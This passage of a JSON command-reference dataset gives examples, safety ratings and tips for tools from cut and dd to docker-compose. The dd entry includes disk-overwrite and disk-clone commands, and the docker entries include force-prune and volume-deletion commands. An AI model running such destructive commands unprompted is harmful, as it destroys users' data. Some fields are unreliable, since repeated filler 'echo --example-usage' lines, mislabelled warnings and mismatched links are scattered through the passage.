        "title": "cut | sort | uniq"
      }
    ],
    "relatedCommands": [
      {
        "name": "awk",
        "relationship": "powerful",
        "reason": "More flexible field processing with programming features"
      },
      {
        "name": "sort",
        "relationship": "combo",
        "reason": "Often used together to extract and sort fields"
      },
      {
        "name": "uniq",
        "relationship": "combo",
        "reason": "Remove duplicates from cut output"
      }
    ],
    "warnings": [
      "Cannot extract fields in different order than they appear",
      "Tab is default field delimiter, not space",
      "Character counting is 1-based, not 0-based"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/cut.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/cut.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/cut-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "cypress",
    "subtitle": "Cypress",
    "description": "End-to-end testing framework for web applications",
    "examples": [
      "cypress open  # Launch interactive Cypress test runner",
      "cypress run  # Run all tests in headless mode",
      "cypress run --spec 'cypress/e2e/login.cy.js'  # Run specific test specification",
      "cypress run --browser chrome  # Run tests using Chrome browser",
      "cypress run --record --key=abc123  # Record test run to Cypress Dashboard",
      "cypress run --env NODE_ENV=staging  # Run tests with custom environment variables",
      "cypress run --config video=false,screenshotOnRunFailure=false  # Run without video/screenshot capture",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "cypress [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "CI pipeline testing",
        "commands": "cypress run --browser chrome --headless --spec 'cypress/e2e/**/*.cy.js'",
        "explanation": "Run all E2E tests in Chrome for continuous integration",
        "title": "cypress"
      }
    ],
    "relatedCommands": [
      {
        "name": "selenium",
        "relationship": "alternative",
        "reason": "Traditional web automation framework"
      },
      {
        "name": "playwright",
        "relationship": "alternative",
        "reason": "Modern cross-browser automation framework"
      }
    ],
    "warnings": [
      "Excellent debugging capabilities with time-travel",
      "Built-in network stubbing and mocking",
      "Automatic waiting for elements eliminates flaky tests"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.cypress.io/"
      },
      {
        "platform": "macos",
        "url": "https://docs.cypress.io/"
      },
      {
        "platform": "windows",
        "url": "https://docs.cypress.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "datadog",
    "subtitle": "Datadog CLI",
    "description": "Command-line tools for Datadog monitoring and observability platform",
    "examples": [
      "datadog metric post 'custom.metric' 42 --tags env:production  # Send custom metric to Datadog",
      "datadog monitor create --type metric --query 'avg(last_5m):avg:system.cpu.user{*} > 80'  # Create CPU usage monitor",
      "datadog dashboard list  # List all Datadog dashboards",
      "datadog service check web.response 0 --tags service:web  # Submit service check status",
      "datadog event post 'Deployment completed' --tags deploy:v1.0.0  # Send deployment event to Datadog",
      "datadog synthetics run-tests --public-id abc-123-def  # Trigger synthetic API test run",
      "datadog logs search 'service:web error' --from=-1h  # Search logs from last hour with filters",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "caution",
    "syntaxPattern": "datadog [command] [options]",
    "prerequisites": [
      "datadog-account"
    ],
    "commandCombinations": [
      {
        "scenario": "Deployment monitoring",
        "commands": "datadog event post 'Deployment started' && deploy_app && datadog event post 'Deployment completed'",
        "explanation": "Track deployment lifecycle events",
        "title": "datadog && deploy_app && datadog"
      }
    ],
    "relatedCommands": [
      {
        "name": "newrelic",
        "relationship": "alternative",
        "reason": "Alternative APM and monitoring platform"
      },
      {
        "name": "dynatrace",
        "relationship": "alternative",
        "reason": "Alternative observability platform"
      }
    ],
    "warnings": [
      "Requires API and APP keys",
      "Rate limits apply to API calls",
      "Metric names must follow naming conventions"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://docs.datadoghq.com/api/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "date",
    "subtitle": "date",
    "description": "Display or set system date and time",
    "examples": [
      "date  # Show current system date and time in default format",
      "date +%Y%m%d_%H%M%S  # Output date in YYYYMMDD_HHMMSS format for timestamps",
      "date --iso-8601  # Show date in ISO 8601 standard format",
      "date +%s  # Display seconds since Unix epoch (January 1, 1970)",
      "TZ='America/New_York' date  # Show current time in New York timezone",
      "date -d 'next friday'  # Show date of next Friday",
      "date -d '@1234567890' +'%Y-%m-%d %H:%M:%S'  # Convert Unix timestamp to readable format",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "date [options] [+format]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create timestamped backup",
        "commands": "cp important.txt important_$(date +%Y%m%d).txt.backup",
        "explanation": "Create backup file with current date in filename",
        "title": "cp"
      },
      {
        "scenario": "Log with timestamp",
        "commands": "echo \"$(date): Process completed\" >> logfile.txt",
        "explanation": "Add timestamped entry to log file",
        "title": "echo >> logfile"
      }
    ],
    "relatedCommands": [
      {
        "name": "cal",
        "relationship": "related",
        "reason": "Display calendar for dates"
      },
      {
        "name": "timedatectl",
        "relationship": "system",
        "reason": "System time and timezone management (Linux)"
      },
      {
        "name": "hwclock",
        "relationship": "hardware",
        "reason": "Hardware clock management"
      }
    ],
    "warnings": [
      "Date format options vary between GNU date (Linux) and BSD date (macOS)",
      "Setting system date usually requires root privileges",
      "Time zone changes affect date output"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/date.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/date.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/date-invocation.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "dbdeployer",
    "subtitle": "Database Deployer",
    "description": "MySQL sandbox deployment tool for testing and development",
    "examples": [
      "dbdeployer deploy single 8.0.28  # Create standalone MySQL 8.0.28 sandbox",
      "dbdeployer deploy replication 8.0.28  # Create master-slave replication environment",
      "dbdeployer deploy multiple 8.0.28 --nodes=3  # Deploy 3 independent MySQL instances",
      "dbdeployer available  # Show MySQL versions available for deployment",
      "dbdeployer sandboxes  # List all currently deployed database sandboxes",
      "dbdeployer delete msb_8_0_28  # Remove specific MySQL sandbox",
      "dbdeployer deploy single 8.0.28 --port=3307  # Create sandbox on custom port",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "dbdeployer [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Testing environment setup",
        "commands": "dbdeployer deploy replication 8.0.28 --nodes=3 && dbdeployer sandboxes && dbdeployer use msb_8_0_28",
        "explanation": "Create replication setup, list sandboxes, and connect",
        "title": "dbdeployer && dbdeployer && dbdeployer"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysql",
        "relationship": "combo",
        "reason": "Connects to deployed MySQL sandbox instances"
      },
      {
        "name": "mysqladmin",
        "relationship": "combo",
        "reason": "Manages deployed MySQL sandbox instances"
      }
    ],
    "warnings": [
      "Requires pre-downloaded MySQL tarballs",
      "Each sandbox uses different ports to avoid conflicts",
      "Sandboxes are meant for testing, not production use"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/datacharmer/dbdeployer"
      },
      {
        "platform": "macos",
        "url": "https://github.com/datacharmer/dbdeployer"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "dc",
    "subtitle": "Desk Calculator",
    "description": "Desk calculator using reverse Polish notation",
    "examples": [
      "dc  # Launch dc reverse Polish notation calculator",
      "echo '2 3 + p' | dc  # Add 2 and 3, then print result (5)",
      "echo '2 100 ^ p' | dc  # Calculate 2 to the power of 100",
      "echo '10 k 22 7 / p' | dc  # Set precision to 10, divide 22 by 7",
      "echo '5 d * p' | dc  # Duplicate 5 on stack, multiply (5*5=25)",
      "echo '16 o 255 p' | dc  # Set output base to 16, print 255 in hex (FF)",
      "echo '3.14159 2 k p' | dc  # Set precision to 2 decimal places, print pi",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "dc [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complex stack calculation",
        "commands": "echo '3 4 5 + * 2 / p' | dc",
        "explanation": "Calculate 3 * (4 + 5) / 2 using RPN",
        "title": "echo | dc"
      },
      {
        "scenario": "Scientific calculation",
        "commands": "echo '10 k 2 v 4 / p' | dc",
        "explanation": "Calculate sqrt(2)/4 with 10 decimal precision",
        "title": "echo | dc"
      }
    ],
    "relatedCommands": [
      {
        "name": "bc",
        "relationship": "similar",
        "reason": "bc provides infix notation calculator"
      },
      {
        "name": "expr",
        "relationship": "alternative",
        "reason": "Simple expression evaluator"
      },
      {
        "name": "awk",
        "relationship": "alternative",
        "reason": "awk can perform mathematical calculations"
      }
    ],
    "warnings": [
      "Reverse Polish notation takes practice to use",
      "Stack-based operations require understanding of stack",
      "Limited built-in mathematical functions"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/bc/manual/html_mono/dc.html"
      },
      {
        "platform": "macos",
        "url": "https://www.gnu.org/software/bc/manual/html_mono/dc.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/bc/manual/dc.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL"
    }
  },
  {
    "name": "dd",
    "subtitle": "Data Definition/Disk Dump",
    "description": "Low-level disk and data manipulation tool",
    "examples": [
      "sudo dd if=/dev/sda of=disk_image.img bs=4M status=progress  # Create complete disk image with progress indicator",
      "sudo dd if=ubuntu.iso of=/dev/sdb bs=4M status=progress && sync  # Write ISO to USB drive and sync filesystem",
      "sudo dd if=/dev/urandom of=/dev/sdb bs=4M status=progress  # Overwrite disk with random data for security",
      "sudo dd if=/dev/sda of=/dev/sdb bs=4M status=progress conv=sync  # Clone entire disk to another disk",
      "sudo dd if=/dev/sda of=mbr_backup.img bs=512 count=1  # Backup first 512 bytes (MBR) of disk",
      "sudo dd if=/dev/zero of=/swapfile bs=1M count=2048  # Create 2GB file filled with zeros for swap",
      "sudo dd if=/dev/sda bs=4M | gzip > disk_backup.gz  # Create compressed disk backup",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "dangerous",
    "syntaxPattern": "dd if=source of=destination [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete disk backup workflow",
        "commands": "sudo dd if=/dev/sda of=backup.img bs=4M status=progress && sha256sum backup.img > backup.sha256 && gzip backup.img",
        "explanation": "Create disk image, generate checksum, compress",
        "title": "sudo && sha256sum > backup && gzip"
      }
    ],
    "relatedCommands": [
      {
        "name": "fdisk",
        "relationship": "combo",
        "reason": "Often used together for disk operations"
      },
      {
        "name": "gzip",
        "relationship": "combo",
        "reason": "Compress large disk images"
      }
    ],
    "warnings": [
      "Wrong of= parameter can destroy data",
      "Always double-check device names",
      "Use appropriate block size for performance"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/dd.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "deno",
    "subtitle": "Deno",
    "description": "Secure runtime for JavaScript and TypeScript",
    "examples": [
      "deno run app.ts  # Execute TypeScript file directly",
      "deno run --allow-net --allow-read server.ts  # Run with network and file system permissions",
      "deno install --allow-net --allow-read https://deno.land/std/http/file_server.ts  # Install HTTP file server globally",
      "deno fmt src/  # Format all TypeScript files in src directory",
      "deno test  # Execute all test files in project",
      "deno bundle app.ts app.bundle.js  # Create single JavaScript bundle",
      "deno  # Launch interactive TypeScript/JavaScript shell"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "deno <command> [options] [script]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Web server development",
        "commands": "deno run --allow-net --allow-read --watch server.ts",
        "explanation": "Run server with file watching and necessary permissions",
        "title": "deno"
      },
      {
        "scenario": "Code quality workflow",
        "commands": "deno fmt && deno lint && deno test",
        "explanation": "Format, lint, and test code in sequence",
        "title": "deno && deno && deno"
      }
    ],
    "relatedCommands": [
      {
        "name": "node",
        "relationship": "alternative",
        "reason": "Traditional JavaScript runtime"
      },
      {
        "name": "bun",
        "relationship": "similar",
        "reason": "Modern JavaScript runtime alternative"
      },
      {
        "name": "tsc",
        "relationship": "alternative",
        "reason": "Deno has built-in TypeScript support"
      }
    ],
    "warnings": [
      "Permission system requires explicit flags",
      "Import URLs instead of npm packages by default",
      "Different module system from Node.js"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://deno.land/manual/"
      },
      {
        "platform": "macos",
        "url": "https://deno.land/manual/"
      },
      {
        "platform": "windows",
        "url": "https://deno.land/manual/"
      },
      {
        "platform": "generic",
        "url": "https://deno.land/manual/getting_started"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "df",
    "subtitle": "disk free",
    "description": "Display filesystem disk space usage",
    "examples": [
      "df -h  # Show disk usage in human-readable format (GB, MB)",
      "df -h /home  # Check disk usage for specific mount point",
      "df -i  # Display inode usage instead of disk space",
      "df -h -l  # Exclude network filesystems from output"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "df [options] [filesystem]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Alert when disk space is low",
        "commands": "df -h | awk '$5 > 80 {print $0}'",
        "explanation": "Show filesystems with more than 80% usage",
        "title": "df | awk > 80"
      },
      {
        "scenario": "Monitor disk usage over time",
        "commands": "watch 'df -h'",
        "explanation": "Continuously monitor disk space changes",
        "title": "watch"
      }
    ],
    "relatedCommands": [
      {
        "name": "du",
        "relationship": "combo",
        "reason": "Use du to find what's using disk space after df shows it's full"
      },
      {
        "name": "lsblk",
        "relationship": "similar",
        "reason": "Show block devices and mount points"
      },
      {
        "name": "ncdu",
        "relationship": "alternative",
        "reason": "Interactive disk usage analyzer"
      }
    ],
    "warnings": [
      "df shows filesystem-level usage, not directory contents",
      "100% usage can prevent new file creation",
      "Reserved space for root may show >100% for regular users"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/df.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/df.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL only"
    }
  },
  {
    "name": "dig",
    "subtitle": "Domain Information Groper",
    "description": "Flexible DNS lookup tool with detailed output",
    "examples": [
      "dig google.com  # Look up A records for google.com",
      "dig google.com MX  # Look up mail exchange records",
      "dig +short google.com  # Show only the IP address result",
      "dig -x 8.8.8.8  # Reverse lookup for IP address",
      "dig @8.8.8.8 google.com  # Query using specific DNS server",
      "dig +trace google.com  # Show complete DNS resolution path",
      "dig google.com ANY  # Attempt to retrieve all DNS records"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "dig [options] [name] [type]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "DNS troubleshooting",
        "commands": "dig google.com && dig @8.8.8.8 google.com && dig @1.1.1.1 google.com",
        "explanation": "Compare results from different DNS servers",
        "title": "dig && dig && dig"
      }
    ],
    "relatedCommands": [
      {
        "name": "nslookup",
        "relationship": "alternative",
        "reason": "Traditional DNS lookup tool with different interface"
      },
      {
        "name": "host",
        "relationship": "similar",
        "reason": "Simpler DNS lookup utility"
      }
    ],
    "warnings": [
      "Output can be verbose without +short option",
      "ANY queries may not return all record types on some servers",
      "Requires bind-utils package on some distributions"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/dig.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/dig.html"
      },
      {
        "platform": "windows",
        "url": "https://man7.org/linux/man-pages/man1/dig.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "dirname",
    "subtitle": "directory name",
    "description": "Extract directory path from full path",
    "examples": [
      "dirname /path/to/file.txt  # Extract '/path/to' from full path",
      "dirname /path/to/directory  # Get '/path/to' from directory path",
      "dirname /path/file1 /other/file2  # Extract directory from multiple paths",
      "dirname /  # Returns '/' for root directory"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "dirname <path>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create directory for file",
        "commands": "FILE=/path/to/new/file.txt && mkdir -p \"$(dirname \"$FILE\")\" && touch \"$FILE\"",
        "explanation": "Create parent directories then create file",
        "title": "FILE && mkdir && touch"
      },
      {
        "scenario": "Backup to same directory as original",
        "commands": "cp file.txt \"$(dirname file.txt)/file.txt.backup\"",
        "explanation": "Create backup in same directory as original",
        "title": "cp"
      }
    ],
    "relatedCommands": [
      {
        "name": "basename",
        "relationship": "opposite",
        "reason": "basename extracts filename, dirname extracts directory"
      },
      {
        "name": "realpath",
        "relationship": "combo",
        "reason": "Get absolute path then extract directory"
      },
      {
        "name": "mkdir",
        "relationship": "combo",
        "reason": "Create directories extracted by dirname"
      }
    ],
    "warnings": [
      "dirname handles trailing slashes differently than basename",
      "Returns '.' for filenames without directory component",
      "Result doesn't include trailing slash except for root"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/dirname.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/dirname.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/dirname-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "dmesg",
    "subtitle": "Display Message",
    "description": "Display kernel ring buffer messages",
    "examples": [
      "dmesg  # Display all messages from kernel ring buffer",
      "dmesg -w  # Watch for new kernel messages in real-time",
      "dmesg -T  # Show messages with human-readable timestamps",
      "dmesg -f kern  # Show only kernel facility messages",
      "dmesg -l err,crit,alert,emerg  # Show only error and above priority messages",
      "sudo dmesg -c  # Display messages and clear the buffer",
      "dmesg | tail -20  # Show last 20 kernel messages"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "caution",
    "syntaxPattern": "dmesg [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Hardware troubleshooting",
        "commands": "dmesg -T | grep -i error && lsusb && lspci",
        "explanation": "Check kernel errors and list USB/PCI devices",
        "title": "dmesg | grep && lsusb && lspci"
      }
    ],
    "relatedCommands": [
      {
        "name": "journalctl",
        "relationship": "modern-alternative",
        "reason": "journalctl -k shows kernel messages on systemd systems"
      },
      {
        "name": "syslog",
        "relationship": "complementary",
        "reason": "syslog may also contain kernel messages"
      }
    ],
    "warnings": [
      "Ring buffer has limited size, old messages are overwritten",
      "Timestamps depend on system configuration",
      "Essential for hardware and driver troubleshooting"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/dmesg.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/dmesg.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "dnf",
    "subtitle": "Dandified YUM",
    "description": "Modern package manager for Red Hat-based distributions",
    "examples": [
      "sudo dnf check-update  # Check for available package updates",
      "sudo dnf install vim  # Install vim text editor",
      "sudo dnf upgrade  # Upgrade all installed packages",
      "sudo dnf remove package-name  # Uninstall package and dependencies",
      "dnf search docker  # Find packages related to docker",
      "dnf history  # Display transaction history",
      "sudo dnf group install 'Development Tools'  # Install entire package group"
    ],
    "platform": [
      "linux"
    ],
    "category": "package-management",
    "safety": "caution",
    "syntaxPattern": "dnf [options] <command> [package]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Full system update",
        "commands": "sudo dnf upgrade && sudo dnf autoremove",
        "explanation": "Update packages and remove orphaned dependencies",
        "title": "sudo && sudo"
      },
      {
        "scenario": "Install multimedia codecs",
        "commands": "sudo dnf install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm && sudo dnf install ffmpeg",
        "explanation": "Add RPM Fusion repo and install multimedia tools",
        "title": "sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "yum",
        "relationship": "alternative",
        "reason": "Older package manager that dnf replaces"
      },
      {
        "name": "rpm",
        "relationship": "combo",
        "reason": "Low-level package format that dnf manages"
      },
      {
        "name": "flatpak",
        "relationship": "alternative",
        "reason": "Universal package format on modern Fedora"
      }
    ],
    "warnings": [
      "Replacement for yum with better dependency resolution",
      "Transaction history can be used to rollback changes",
      "Module streams allow multiple versions of software"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/dnf.8.html"
      },
      {
        "platform": "generic",
        "url": "https://dnf.readthedocs.io/"
      }
    ],
    "distroNotes": {
      "linux": "Fedora, RHEL 8+, CentOS Stream"
    }
  },
  {
    "name": "docker",
    "subtitle": "Docker",
    "description": "Container platform for building, sharing, and running applications",
    "examples": [
      "docker build -t myapp:latest .  # Builds Docker image from Dockerfile in current directory",
      "docker run -d -p 8080:80 myapp:latest  # Runs container in detached mode mapping port 8080 to 80",
      "docker ps  # Shows all currently running containers",
      "docker exec -it container_name bash  # Opens interactive bash shell in running container",
      "docker logs -f container_name  # Shows and follows log output from container",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "docker <command> [options] [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Build and run application",
        "commands": "docker build -t myapp . && docker run -d -p 8080:80 myapp",
        "explanation": "Builds image and immediately runs it with port mapping",
        "title": "docker && docker"
      },
      {
        "scenario": "Stop and remove all containers",
        "commands": "docker stop $(docker ps -q) && docker rm $(docker ps -aq)",
        "explanation": "Stops all running containers and removes all containers",
        "title": "docker && docker"
      },
      {
        "scenario": "Clean development environment",
        "commands": "docker stop $(docker ps -q) && docker system prune -f",
        "explanation": "Stop all containers and clean up resources",
        "title": "docker && docker"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker-compose",
        "relationship": "orchestration",
        "reason": "Docker Compose orchestrates multi-container Docker applications"
      },
      {
        "name": "kubernetes",
        "relationship": "orchestration",
        "reason": "Kubernetes orchestrates Docker containers at scale"
      },
      {
        "name": "podman",
        "relationship": "alternative",
        "reason": "Podman provides similar container functionality without daemon"
      }
    ],
    "warnings": [
      "Docker daemon must be running to execute commands",
      "Images can become large without proper layer optimization",
      "Port conflicts can occur when multiple containers use same ports",
      "Container data is ephemeral unless volumes are used"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.docker.com/engine/install/"
      },
      {
        "platform": "macos",
        "url": "https://docs.docker.com/desktop/install/mac-install/"
      },
      {
        "platform": "windows",
        "url": "https://docs.docker.com/desktop/install/windows-install/"
      },
      {
        "platform": "generic",
        "url": "https://docs.docker.com/reference/commandline/docker/"
      }
    ],
    "distroNotes": {
      "linux": "Available through distribution repositories or Docker's APT/YUM repos",
      "windows": "Docker Desktop for Windows provides full functionality",
      "macos": "Docker Desktop for Mac provides full functionality"
    }
  },
  {
    "name": "docker-build-multistage",
    "subtitle": "Docker Multi-stage Build",
    "description": "Build Docker images using multi-stage builds for optimization",
    "examples": [
      "docker build --target production --build-arg NODE_ENV=production -t myapp:prod .  # Build specific stage with build arguments",
      "docker build --cache-from myapp:cache --build-arg BUILDKIT_INLINE_CACHE=1 -t myapp:latest .  # Build using cache from previous builds for faster builds",
      "docker build -t myapp https://github.com/user/repo.git#main  # Build image directly from Git repository",
      "docker build -f docker/Dockerfile.prod --target runtime -t myapp:runtime .  # Build using specific Dockerfile and target stage",
      "docker build --platform linux/amd64,linux/arm64 -t myapp:multiarch --push .  # Build multi-architecture image and push to registry",
      "docker build --secret id=api_key,src=./secrets/api.key -t myapp .  # Build with secure handling of secrets during build process",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "docker build [options] <path>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Optimized production build pipeline",
        "commands": "docker build --target builder -t myapp:builder . && docker build --cache-from myapp:builder --target production -t myapp:prod .",
        "explanation": "Build and cache builder stage, then use it for optimized production build",
        "title": "docker && docker"
      },
      {
        "scenario": "Development vs production builds",
        "commands": "docker build --target development -t myapp:dev . && docker build --target production -t myapp:prod .",
        "explanation": "Build different targets for development and production environments",
        "title": "docker && docker"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker-push",
        "relationship": "combo",
        "reason": "Push built images to registries"
      },
      {
        "name": "buildah-build",
        "relationship": "alternative",
        "reason": "Alternative OCI image builder"
      },
      {
        "name": "docker-buildx",
        "relationship": "enhanced",
        "reason": "Extended build capabilities with BuildKit"
      }
    ],
    "warnings": [
      "Multi-stage builds require Docker 17.05 or higher",
      "Build context size affects build speed and memory usage",
      "Layer caching behavior differs between local and CI environments"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.docker.com/engine/reference/commandline/build/"
      },
      {
        "platform": "macos",
        "url": "https://docs.docker.com/engine/reference/commandline/build/"
      },
      {
        "platform": "windows",
        "url": "https://docs.docker.com/engine/reference/commandline/build/"
      },
      {
        "platform": "generic",
        "url": "https://docs.docker.com/develop/dev-best-practices/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "docker-compose",
    "subtitle": "Docker Compose",
    "description": "Define and run multi-container Docker applications",
    "examples": [
      "docker-compose up  # Start all services defined in docker-compose.yml",
      "docker-compose up -d  # Start services in detached mode (background)",
      "docker-compose down  # Stop and remove containers, networks, and volumes",
      "docker-compose logs -f web  # Follow logs for specific service in real-time",
      "docker-compose up --scale web=3  # Run 3 instances of web service",
      "docker-compose up --build  # Rebuild images and start services",
      "docker-compose exec web bash  # Open bash shell in running web service container",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "docker-compose [options] [command]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development environment setup",
        "commands": "docker-compose build && docker-compose up -d && docker-compose logs -f",
        "explanation": "Build images, start in background, then follow logs",
        "title": "docker && docker && docker"
      },
      {
        "scenario": "Clean restart with fresh data",
        "commands": "docker-compose down -v && docker-compose up --build",
        "explanation": "Stop and remove volumes, then rebuild and start",
        "title": "docker && docker"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "Docker Compose orchestrates Docker containers"
      },
      {
        "name": "kubectl",
        "relationship": "similar",
        "reason": "Both orchestrate containerized applications"
      },
      {
        "name": "podman-compose",
        "relationship": "alternative",
        "reason": "Podman equivalent of Docker Compose"
      }
    ],
    "warnings": [
      "Requires docker-compose.yml file in current directory",
      "Service names in compose file become network hostnames",
      "Volume mounts can have permission issues on some systems"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.docker.com/compose/"
      },
      {
        "platform": "macos",
        "url": "https://docs.docker.com/compose/"
      },
      {
        "platform": "windows",
        "url": "https://docs.docker.com/compose/"
      },
      {
        "platform": "generic",
        "url": "https://docs.docker.com/compose/reference/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "docker-compose-production",
    "subtitle": "Docker Compose Production",
    "description": "Docker Compose for production deployments and scaling",
    "examples": [
      "docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d  # Deploy using base config with production overrides",
      "docker-compose up -d --no-deps --scale web=3 --remove-orphans web  # Update web service with 3 replicas without affecting dependencies",
      "docker-compose up -d --wait --wait-timeout 300  # Start services and wait for health checks to pass with timeout",
      "docker-compose up -d --scale web=3 --scale worker=2 --compatibility  # Scale multiple services with Docker Swarm compatibility mode",
      "docker-compose -f docker-compose.yml -f docker-compose.prod.yml config --resolve-image-digests  # Validate and display final configuration with image digests",
      "docker-compose down --timeout 30 --remove-orphans  # Gracefully stop services with 30-second timeout",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "docker-compose [options] <command>",
    "prerequisites": [
      "docker-compose"
    ],
    "commandCombinations": [
      {
        "scenario": "Blue-green deployment simulation",
        "commands": "docker-compose -p blue up -d && docker-compose -p green -f docker-compose.yml -f docker-compose.green.yml up -d && docker-compose -p blue down",
        "explanation": "Deploy green version, then remove blue version for zero-downtime deployment",
        "title": "docker && docker && docker"
      },
      {
        "scenario": "Database migration workflow",
        "commands": "docker-compose up -d db && docker-compose run --rm migrate && docker-compose up -d web",
        "explanation": "Start database, run migrations, then start web services",
        "title": "docker && docker && docker"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker-swarm",
        "relationship": "alternative",
        "reason": "Docker Swarm provides native orchestration capabilities"
      },
      {
        "name": "kubernetes",
